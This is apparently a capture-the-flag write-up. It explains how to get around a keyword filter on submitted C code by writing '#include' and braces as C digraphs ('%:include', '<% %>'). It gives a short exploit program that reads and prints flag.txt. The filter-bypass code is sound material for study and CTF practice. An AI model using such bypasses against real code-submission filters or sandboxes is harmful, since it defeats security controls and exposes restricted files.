# Description 

Sometimes just googling things coold help .

files to upload : challenge.py

# Digraph/Trigraph Bypass Exploit

## Overview

This document explains how to bypass security filters using digraphs and trigraphs in C, allowing restricted operations to be executed.

## How It Works

Some security mechanisms filter dangerous functions (e.g., #include). However, C supports digraphs and trigraphs, which can be used as equivalents to bypass filters.

## For example, instead of:

```#include <stdio.h>```

You can use:

```%:include <stdio.h>```

This method allows executing restricted operations by replacing filtered keywords with their equivalents.

## Exploit Code

```
%:include <stdio.h>
%:include <stdlib.h>

int main() <%
    FILE *file;
    char ch;
    file = fopen("flag.txt", "r");
    printf("Content of flag.txt:");
    while ((ch = fgetc(file)) != EOF) <%
        putchar(ch);
    %>
    fclose(file);
    return 0; %>
```

Note: Add an empty newline at the end before submitting.
